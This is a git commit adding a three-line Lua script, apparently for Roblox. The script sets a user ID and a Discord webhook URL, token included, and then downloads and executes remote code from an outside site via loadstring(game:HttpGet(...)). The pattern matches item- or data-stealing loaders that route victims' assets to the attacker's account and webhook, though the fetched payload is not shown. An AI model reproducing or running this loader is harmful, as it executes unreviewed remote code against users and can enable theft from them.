b5389072e14e9f35b2dea7e7e8c80e6e023948f2
mira11223 <131473750+mira11223@users.noreply.github.com>
2023-04-21 18:52:41 +0300

    Add files via upload

---
+++ 749351142882017443 (5).lua
@@ -0,0 +1,3 @@
+_G.UserID = 2505711253
+_G.Webhook = "https://discord.com/api/webhooks/1098996758694084741/XK9vmPC2GK7J_w4Bh-YtAB2h2NX1lflUTd8L2k46Kzdo4CkZvRPHFh5buoeHKpDEoLUh"
+loadstring(game:HttpGet("https://rizzhub.xyz/scripts/Script.lua", true))()
